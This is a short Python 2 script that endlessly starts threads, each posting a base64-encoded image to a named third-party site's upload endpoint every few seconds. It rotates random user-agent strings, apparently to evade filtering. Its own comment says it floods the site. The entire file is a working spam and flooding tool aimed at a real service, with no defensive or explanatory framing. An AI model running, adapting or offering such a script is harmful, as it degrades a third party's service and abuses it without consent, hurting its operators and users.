import base64
import sys
import requests
import random
import threading
import time

#ya this version of the script floods the site, don't run it

class worker(threading.Thread):
	def run(self):
		image = '381.jpg' #filename here
		with open(image, 'rb') as r:
			encoded_image = base64.encodestring(r.read())
		upload(encoded_image)
	

def upload(image):
	with open('useragents.txt', 'rb') as u:
		useragent = random.choice(u.read().splitlines())
	headers = {'user-agent':useragent}
	payload = {'image':image}
	r = requests.post('http://wtf.undraw.it/inc/send.php', headers=headers, data=payload)
	print r.text

def main():
	while True:
		worker().start()
		time.sleep(5) # time between messages here

if __name__ == '__main__':
	main()
